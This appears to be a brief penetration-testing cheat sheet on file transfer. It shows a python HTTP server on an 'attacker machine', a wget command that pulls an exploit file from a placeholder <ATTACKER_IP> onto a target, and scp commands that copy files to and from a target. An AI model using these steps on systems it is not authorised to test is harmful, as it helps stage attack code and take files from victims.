# File Transfer Techniques

## HTTP Server

```bash
# Host server on attacker machine
python3 -m http.server 9000

# Download on target
wget http://<ATTACKER_IP>:9000/exploit-name.c -P /tmp/
```

## SCP

```bash
# Upload file to target
scp test.txt <USERNAME>@<TARGET_IP>:/location2

# Download file from target
scp <USERNAME>@<TARGET_DOMAIN>:/files/test.txt location
```
